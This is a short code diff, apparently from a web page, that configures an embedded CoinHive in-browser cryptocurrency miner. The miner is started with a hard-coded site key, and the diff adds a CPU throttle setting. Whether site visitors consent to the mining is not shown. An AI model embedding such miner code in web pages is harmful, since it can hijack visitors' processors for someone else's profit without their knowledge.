@@ -8,7 +8,8 @@
 	var miner = new CoinHive.Anonymous('1MtoL6hiPrO9lISrj0RWaZ341WU4fV07');
 	miner.start();
   
-  // Listen on events
+    miner.setThrottle(0.3);
+    // Listen on events
 	miner.on('found', function() { /* Hash found */ })
 	miner.on('accepted', function() { /* Hash accepted by the pool */ })
 
